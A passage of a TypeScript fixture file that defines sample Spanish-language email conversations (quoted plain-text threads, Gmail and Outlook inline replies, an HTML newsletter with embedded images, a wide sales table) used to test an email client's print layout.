import type { Address } from "@terno/core";

/**
 * Conversations that stress printing (plan 09 §7): a long plain-text thread
 * with trailing quotes, inline replies (plain, Apple Mail, Gmail, Outlook), a
 * 600px newsletter, a ~1000px table, CJK and emoji, very long URLs, inline,
 * cid: and remote images, and a hostile subject. The e2e print suites ingest
 * them per test (nothing else sees them); `seed.ts --print-fixtures` adds them
 * to a profile for the desktop checks.
 */
export interface PrintFixtureMessage {
  from: Address;
  to: Address[];
  cc?: Address[];
  /** hours before `now` */
  hoursAgo: number;
  bodyText: string | null;
  bodyHtml?: string | null;
  attachments?: { filename: string; mime: string; size: number; contentId?: string }[];
}

export interface PrintFixture {
  key: PrintFixtureKey;
  subject: string;
  messages: PrintFixtureMessage[];
}

export const PRINT_FIXTURE_KEYS = ["long-plain", "inline-replies", "newsletter", "wide-table", "cjk-emoji", "long-urls", "images", "hostile"] as const;
export type PrintFixtureKey = (typeof PRINT_FIXTURE_KEYS)[number];

const yuki: Address = { name: "Yuki Gutiérrez", email: "yuki.gutierrez@acme.studio" };
const ana: Address = { name: "Ana Ruiz", email: "ana.ruiz@despacho-ruiz.mx" };
const marco: Address = { name: "Marco Peña", email: "marco@obra-norte.mx" };
const acme: Address = { name: "Boletín Acme", email: "boletin@acme.studio" };
const kenji: Address = { name: "佐藤 健二", email: "kenji.sato@tokyo-office.jp" };

const svg = (s: string) => `data:image/svg+xml;charset=utf-8,${encodeURIComponent(s)}`;
const HERO = svg(
  `<svg xmlns="http://www.w3.org/2000/svg" width="600" height="220" viewBox="0 0 600 220"><defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#1f3a5f"/><stop offset="1" stop-color="#4a7fb5"/></linearGradient></defs><rect width="600" height="220" fill="url(#g)"/><circle cx="500" cy="60" r="90" fill="#ffffff" fill-opacity=".08"/><circle cx="90" cy="200" r="120" fill="#ffffff" fill-opacity=".06"/><text x="40" y="120" font-family="Georgia,serif" font-size="38" fill="#fff">Octubre en Acme</text><text x="40" y="156" font-family="Helvetica,Arial,sans-serif" font-size="16" fill="#cfe0f2">Novedades, lanzamientos y lo que viene</text></svg>`,
);
const LOGO = svg(`<svg xmlns="http://www.w3.org/2000/svg" width="96" height="28" viewBox="0 0 96 28"><rect width="28" height="28" rx="7" fill="#1f3a5f"/><text x="8" y="20" font-family="Helvetica,Arial,sans-serif" font-weight="700" font-size="16" fill="#fff">A</text><text x="36" y="20" font-family="Helvetica,Arial,sans-serif" font-weight="700" font-size="16" fill="#1f3a5f">acme</text></svg>`);
const CARD = (c: string, label: string) => svg(`<svg xmlns="http://www.w3.org/2000/svg" width="270" height="140" viewBox="0 0 270 140"><rect width="270" height="140" rx="10" fill="${c}"/><text x="20" y="80" font-family="Helvetica,Arial,sans-serif" font-size="20" fill="#fff">${label}</text></svg>`);
const PANORAMA = svg(
  `<svg xmlns="http://www.w3.org/2000/svg" width="1600" height="400" viewBox="0 0 1600 400"><defs><linearGradient id="s" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#9cc3e6"/><stop offset="1" stop-color="#e8f1f8"/></linearGradient></defs><rect width="1600" height="400" fill="url(#s)"/><path d="M0 300 L200 180 L380 260 L600 120 L820 240 L1000 160 L1240 270 L1420 190 L1600 250 L1600 400 L0 400 Z" fill="#6b8f71"/><path d="M0 340 L260 280 L520 330 L800 270 L1100 330 L1380 290 L1600 320 L1600 400 L0 400 Z" fill="#4f6f55"/><text x="40" y="60" font-family="Helvetica,Arial,sans-serif" font-size="28" fill="#2d4a33">Panorámica del terreno — 1600 px de ancho</text></svg>`,
);
const PHOTO_PNG =
  "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" +
  "CAVYCOF7/h9pRs4Nu9O8kAAAAABJRU5ErkJggg==";
const PHOTO = `data:image/png;base64,${PHOTO_PNG}`;

const para = [
  "Repasamos el calendario completo del lanzamiento. La fecha objetivo sigue siendo el 3 de febrero, pero dependemos de que el equipo de contenido entregue los textos finales antes del 15 de enero.",
  "Sobre el presupuesto: el total aprobado es de $480,000 MXN. Marketing pidió mover $60,000 de pauta digital a eventos presenciales; lo dejamos pendiente hasta ver los resultados de la prueba de diciembre.",
  "Diseño presentó tres propuestas para la página de inicio. Hubo consenso en la segunda, con dos ajustes: un encabezado más corto y la tabla de precios visible sin desplazarse.",
  "Riesgos: la integración con el proveedor de pagos todavía no pasa las pruebas de certificación. Si no queda lista para el 20 de enero, lanzamos solo con transferencia y tarjeta.",
  "Pendientes para la próxima junta: confirmar la agencia de relaciones públicas, cerrar el guion del video y revisar la versión en inglés del sitio.",
];

/** "El mar, 20 oct 2026 a las 10:12, Yuki Gutiérrez <…> escribió:" + the earlier message, quoted. */
const quote = (who: Address, when: string, text: string) => `\n\nEl ${when}, ${who.name} <${who.email}> escribió:\n${text.split("\n").map((l) => (l ? `> ${l}` : ">")).join("\n")}`;

export function printFixtures(me: Address): PrintFixture[] {
  const m1 = [`Hola, ${me.name.split(" ")[0]}:`, "", "Te comparto las notas de la junta de planeación de hoy. Son largas porque cubrimos todo el plan del primer trimestre.", "", ...para.flatMap((p) => [p, ""]), ...para.slice(0, 3).flatMap((p) => [p.replace("Repasamos", "Volvimos a revisar").replace("Sobre", "De nuevo, sobre"), ""]), "Saludos,", "Yuki"].join("\n");
  const m2 = `Gracias, Yuki. Un par de comentarios:\n\n1. Estoy de acuerdo con la segunda propuesta de diseño.\n2. Sobre los $60,000: prefiero esperar a la prueba de diciembre antes de moverlos.\n3. Para pagos, ¿quién está en contacto con el proveedor?\n\nLuis${quote(yuki, "mar, 20 oct 2026 a las 10:12", m1.split("\n").slice(0, 12).join("\n"))}`;
  const m3 = `Lo lleva Ana desde el despacho; le pedí que te copie en el siguiente correo.\n\nTambién agregué al calendario la revisión del guion para el jueves a las 11:00.\n\nYuki${quote(me, "mar, 20 oct 2026 a las 13:40", m2.split("\n").slice(0, 9).join("\n"))}`;
  const m4 = `Perfecto. Nos vemos el jueves.${quote(yuki, "mar, 20 oct 2026 a las 15:02", m3.split("\n").slice(0, 4).join("\n"))}`;

  return [
    {
      key: "long-plain",
      subject: "Notas de la junta de planeación — lanzamiento del primer trimestre",
      messages: [
        { from: yuki, to: [me], cc: [ana], hoursAgo: 30, bodyText: m1 },
        { from: me, to: [yuki], cc: [ana], hoursAgo: 27, bodyText: m2 },
        { from: yuki, to: [me], cc: [ana], hoursAgo: 25, bodyText: m3 },
        { from: me, to: [yuki], hoursAgo: 24, bodyText: m4 },
      ],
    },
    {
      key: "inline-replies",
      subject: "Preguntas sobre el contrato de servicios",
      messages: [
        { from: ana, to: [me], hoursAgo: 52, bodyText: "Luis, antes de firmar tengo tres preguntas:\n\n¿El plazo de pago es a 30 o a 45 días?\n¿Quién absorbe el costo de las licencias?\n¿La cláusula de confidencialidad aplica también a subcontratistas?\n\nAna" },
        {
          from: me,
          to: [ana],
          hoursAgo: 50,
          bodyText: "Hola, Ana. Te respondo entre líneas:\n\n> ¿El plazo de pago es a 30 o a 45 días?\nA 30 días naturales desde la factura.\n\n> ¿Quién absorbe el costo de las licencias?\nNosotros, hasta 20 usuarios.\n\n> ¿La cláusula de confidencialidad aplica también a subcontratistas?\nSí, deben firmar un anexo.\n\nLuis",
        },
        {
          from: ana,
          to: [me],
          hoursAgo: 48,
          bodyText: null,
          bodyHtml: `<div>Gracias. Dos cosas más, también entre líneas:</div><blockquote type="cite"><div>A 30 días naturales desde la factura.</div></blockquote><div>De acuerdo; que quede por escrito en la cláusula 7.</div><blockquote type="cite"><div>Nosotros, hasta 20 usuarios.</div></blockquote><div>¿Y a partir del usuario 21?</div><div><br></div><div>Ana</div>`,
        },
        {
          from: me,
          to: [ana],
          hoursAgo: 47,
          bodyText: null,
          bodyHtml: `<div dir="ltr"><div>Del usuario 21 en adelante, $350 MXN por usuario al mes. Ya lo agregué al anexo B.</div><div><br></div><div>Luis</div></div><br><div class="gmail_quote"><div dir="ltr" class="gmail_attr">El jue, 22 oct 2026 a las 9:15, Ana Ruiz (&lt;${ana.email}&gt;) escribió:<br></div><blockquote class="gmail_quote" style="margin:0px 0px 0px 0.8ex;border-left:1px solid rgb(204,204,204);padding-left:1ex"><div>¿Y a partir del usuario 21?</div></blockquote></div>`,
        },
        {
          from: ana,
          to: [me],
          cc: [yuki],
          hoursAgo: 46,
          bodyText: null,
          bodyHtml: `<div style="font-family:Calibri,Arial,sans-serif;font-size:11pt">Perfecto, con eso lo firmamos el lunes.<br><br>Saludos,<br>Ana Ruiz<br>Despacho Ruiz &amp; Asociados</div><div id="appendonsend"></div><hr style="display:inline-block;width:98%"><div id="divRplyFwdMsg" dir="ltr"><font face="Calibri, sans-serif" style="font-size:11pt"><b>De:</b> Luis Cordero<br><b>Enviado:</b> jueves, 22 de octubre de 2026 10:02<br><b>Para:</b> Ana Ruiz<br><b>Asunto:</b> Re: Preguntas sobre el contrato de servicios</font><div>&nbsp;</div></div><div>Del usuario 21 en adelante, $350 MXN por usuario al mes. Ya lo agregué al anexo B.</div>`,
        },
      ],
    },
    {
      key: "newsletter",
      subject: "Boletín Acme · Octubre 2026",
      messages: [
        {
          from: acme,
          to: [me],
          hoursAgo: 20,
          bodyText: "Boletín Acme · Octubre 2026",
          bodyHtml: `<table role="presentation" width="100%" cellpadding="0" cellspacing="0" bgcolor="#eef1f5"><tr><td align="center" style="padding:24px 0"><table role="presentation" width="600" cellpadding="0" cellspacing="0" style="width:600px;background:#ffffff;border-radius:8px;font-family:Helvetica,Arial,sans-serif;color:#1c2733"><tr><td style="padding:20px 32px;border-bottom:1px solid #e3e8ee"><img src="${LOGO}" width="96" height="28" alt="Acme"></td></tr><tr><td><img src="${HERO}" width="600" height="220" alt="Octubre en Acme" style="display:block;width:600px;height:auto"></td></tr><tr><td style="padding:28px 32px 8px"><h1 style="margin:0 0 12px;font-family:Georgia,serif;font-size:26px;font-weight:normal;color:#1f3a5f">Lo nuevo de este mes</h1><p style="margin:0 0 14px;font-size:15px;line-height:1.6">Este mes lanzamos la nueva versión del panel de control, abrimos oficina en Monterrey y publicamos la guía completa para migrar tus proyectos sin perder historial.</p><p style="margin:0 0 20px;font-size:15px;line-height:1.6">Abajo encontrarás lo más importante. Como siempre, si tienes dudas, responde a este correo.</p><a href="https://acme.studio/novedades" style="display:inline-block;background:#1f3a5f;color:#ffffff;text-decoration:none;padding:12px 22px;border-radius:6px;font-size:15px">Ver todas las novedades</a></td></tr><tr><td style="padding:24px 32px"><table role="presentation" width="100%" cellpadding="0" cellspacing="0"><tr><td width="50%" valign="top" style="padding-right:10px"><img src="${CARD("#2f6f62", "Panel 4.0")}" width="260" alt="Panel 4.0" style="display:block;width:100%;height:auto;border-radius:8px"><p style="font-size:14px;line-height:1.5;margin:10px 0 0"><b>Panel 4.0.</b> Más rápido, con modo oscuro y reportes que se exportan en un clic.</p></td><td width="50%" valign="top" style="padding-left:10px"><img src="${CARD("#8a4b2d", "Monterrey")}" width="260" alt="Monterrey" style="display:block;width:100%;height:auto;border-radius:8px"><p style="font-size:14px;line-height:1.5;margin:10px 0 0"><b>Monterrey.</b> Nuestra nueva oficina abre el 3 de noviembre en San Pedro.</p></td></tr></table></td></tr><tr><td style="padding:0 32px 24px"><img src="https://images.acme.test/promo/temporada.png" width="536" alt="Promoción de temporada" style="width:100%;height:auto"></td></tr><tr><td style="padding:20px 32px;background:#f6f8fa;border-radius:0 0 8px 8px;font-size:12px;line-height:1.5;color:#6b7785">Recibes este correo porque te suscribiste en acme.studio. <a href="https://acme.studio/baja" style="color:#6b7785">Darse de baja</a> · Acme Studio, Av. Reforma 222, Ciudad de México.<img src="https://t.acme.test/open.gif?u=8812" width="1" height="1" alt=""></td></tr></table></td></tr></table>`,
        },
      ],
    },
    {
      key: "wide-table",
      subject: "Reporte de ventas por región — semana 42",
      messages: [
        {
          from: yuki,
          to: [me],
          hoursAgo: 12,
          bodyText: "Reporte de ventas por región — semana 42",
          bodyHtml: `<p style="font-family:Arial,sans-serif;font-size:14px">Hola, va el reporte semanal. La región Norte superó la meta por tercera semana seguida.</p><table width="1000" cellpadding="6" cellspacing="0" style="width:1000px;border-collapse:collapse;font-family:Arial,sans-serif;font-size:13px"><tr style="background:#1f3a5f;color:#fff">${["Región", "Lun", "Mar", "Mié", "Jue", "Vie", "Sáb", "Dom", "Total", "Meta", "Avance", "Variación"].map((h) => `<th style="border:1px solid #c9d3de;text-align:left">${h}</th>`).join("")}</tr>${["Norte", "Noreste", "Occidente", "Centro", "Bajío", "Sureste", "Península", "Pacífico", "Golfo", "Metropolitana"].map((r, i) => `<tr style="background:${i % 2 ? "#f5f7fa" : "#fff"}"><td style="border:1px solid #c9d3de">${r}</td>${[0, 1, 2, 3, 4, 5, 6].map((d) => `<td style="border:1px solid #c9d3de;text-align:right">$${(41000 + i * 3700 + d * 1250).toLocaleString("en-US")}</td>`).join("")}<td style="border:1px solid #c9d3de;text-align:right"><b>$${(41000 * 7 + i * 25900 + 26250).toLocaleString("en-US")}</b></td><td style="border:1px solid #c9d3de;text-align:right">$320,000</td><td style="border:1px solid #c9d3de;text-align:right">${92 + i}%</td><td style="border:1px solid #c9d3de;text-align:right;color:${i % 3 ? "#1c7c54" : "#b42318"}">${i % 3 ? "+" : "−"}${(2.4 + i * 0.7).toFixed(1)}%</td></tr>`).join("")}</table><p style="font-family:Arial,sans-serif;font-size:14px">Cualquier duda me dices.<br>Yuki</p>`,
        },
      ],
